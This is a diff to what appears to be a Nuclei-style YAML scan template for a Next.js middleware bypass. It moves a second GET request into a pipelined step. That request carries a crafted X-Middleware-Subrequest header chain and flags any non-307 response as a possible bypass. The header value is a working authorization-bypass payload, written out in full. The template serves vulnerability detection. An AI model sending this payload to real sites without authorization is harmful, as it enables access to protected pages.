@@ -33,24 +33,24 @@ requests:
         status:
           - 307
 
-    # If 307, do a retry with injection
-    stop-at-first-match: true
-    next:
-      - method: GET
-        path:
-          - "{{BaseURL}}/"
+    # If match, pipeline into second request
+    pipeline: true
 
-        headers:
-          X-Nextjs-Data: "1"
-          Accept-Encoding: "gzip, deflate, br"
-          Accept: "*/*"
-          Accept-Language: "en-US;q=0.9,en;q=0.8"
-          User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
-          Connection: "close"
-          Cache-Control: "max-age=0"
-          X-Middleware-Subrequest: "src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware"
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
 
-        matchers:
-          - type: status
-            status:
-              - "!307"  # STATUS CODE IS NOT 307 --> means possible bypass
+    headers:
+      X-Nextjs-Data: "1"
+      Accept-Encoding: "gzip, deflate, br"
+      Accept: "*/*"
+      Accept-Language: "en-US;q=0.9,en;q=0.8"
+      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+      Connection: "close"
+      Cache-Control: "max-age=0"
+      X-Middleware-Subrequest: "src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware"
+
+    matchers:
+      - type: status
+        status:
+          - "!307"  # <-- Status is NOT 307, meaning bypass is possible
